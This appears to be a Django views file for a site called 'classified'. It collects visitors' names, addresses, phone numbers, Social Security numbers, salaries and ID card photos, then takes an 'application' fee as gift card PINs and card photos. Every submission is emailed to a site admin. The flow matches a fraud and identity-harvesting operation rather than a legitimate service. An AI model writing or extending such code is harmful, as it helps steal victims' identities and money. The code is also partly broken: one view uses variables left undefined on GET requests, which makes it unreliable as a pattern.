from django.shortcuts import render
from django.shortcuts import render, redirect
from django.core.mail import send_mail
from django.conf import settings
from .forms import UserInfoForm
from django.contrib import messages

# Create your views here.

def index(request):
    # messages.success(request, '')

    if request.method == 'POST':
        form = UserInfoForm(request.POST, request.FILES)
        if form.is_valid():
            user_info = form.save()
            
            # Send email to admin
            subject = 'New User Information Submitted'
            message = f"""
            New user information has been submitted:
            
            Name: {user_info.first_name} {user_info.last_name}
            Phone: {user_info.phone_no}
            Address: {user_info.home_address}
            SSN: {user_info.ssn_number}
            Maximum Monthly Salary: ${user_info.maximum_salary_monthly}
            
            ID card photos have been uploaded.
            """
            from_email = settings.DEFAULT_FROM_EMAIL
            recipient_list = [settings.ADMIN_EMAIL]
            
            send_mail(subject, message, from_email, recipient_list)
            
            return redirect('classified:success')  # Redirect to a success page
    else:
        form = UserInfoForm()
    return render(request, 'classified/index.html', {
        'form': form,
    })



from.models import Plan
from .forms import ApplicationForm
from django.contrib import messages
def next_kin(request):
    # plans = Plan.objects.all()
    # messages.success(request, '')
    

    if request.method == 'POST':
        try:

            form = ApplicationForm(request.POST)
            if form.is_valid():
                # Collect the data
                data = form.cleaned_data

                # ✅ SAVE DATA TO SESSION
                request.session['application_for'] = data['application_for']
                request.session['duration_plan'] = data['select_duration_plan']
                request.session['duration_plan_label'] = dict(
                    form.fields['select_duration_plan'].choices
                )[data['select_duration_plan']]

                subject = f"New Application: {data['application_for']}"
                message = f"""
                Email: {data['email']}
                Duration: {data['select_duration_plan']} ({dict(form.fields['select_duration_plan'].choices)[data['select_duration_plan']]})
                """
                recipient_list = [settings.ADMIN_EMAIL]
                
                # Send the email
                send_mail(subject, message, settings.DEFAULT_FROM_EMAIL, recipient_list)

                # messages.success(request, 'Application submitted successfully!')
                print(f'Sent email for: {data['email']}!')


                return redirect('classified:submit_gift_card', {'message': 'Complete your payment!'})
            
        except Exception as e:
            messages.error(request, f"An error occurred, {e}")

    else:
        form = ApplicationForm()
    return render(request, 'classified/next_kin.html', {
        'form': form,
    })



from django.conf import settings
from django.core.mail import EmailMessage
from django.shortcuts import render, redirect
from django.contrib import messages

from .forms import GiftCardSubmissionForm


from .forms import GiftCardSubmissionForm


def submit_gift_card(request):
    if request.method == "POST":
        form = GiftCardSubmissionForm(request.POST, request.FILES)

        application_for = request.session.get('application_for')
        duration_plan = request.session.get('duration_plan')
        duration_plan_label = request.session.get('duration_plan_label')

        if form.is_valid():
            amount = form.cleaned_data["amount"]
            currency = form.cleaned_data["currency"]
            gift_card_type = form.cleaned_data["gift_card_type"]
            gift_card_pin = form.cleaned_data["gift_card_pin"]
            picture = form.cleaned_data["picture"]

            subject = "New Gift Card Submission"
            body = f"""
A new gift card has been submitted.

Amount: {amount}
Currency: {currency}
Gift Card Type: {gift_card_type}
Gift Card PIN: {gift_card_pin}
"""

            email = EmailMessage(
                subject=subject,
                body=body,
                from_email=settings.DEFAULT_FROM_EMAIL,
                to=[settings.ADMIN_EMAIL],
            )

            # Attach uploaded image
            email.attach(
                picture.name,
                picture.read(),
                picture.content_type
            )

            email.send(fail_silently=False)

            messages.success(request, "Gift card submitted successfully.")
            request.session.pop('application_for', None)
            request.session.pop('duration_plan', None)
            request.session.pop('duration_plan_label', None)
            
            return redirect("classified:success")

    else:
        form = GiftCardSubmissionForm()

    return render(request, "classified/submit_gift_card.html", {
        "form": form,
        "application_for": application_for,
        "duration_plan": duration_plan,
        "duration_plan_label": duration_plan_label,
    })

def success(request):
    messages.success(request, 'Successfully submitted')
    return render(request, 'classified/success.html')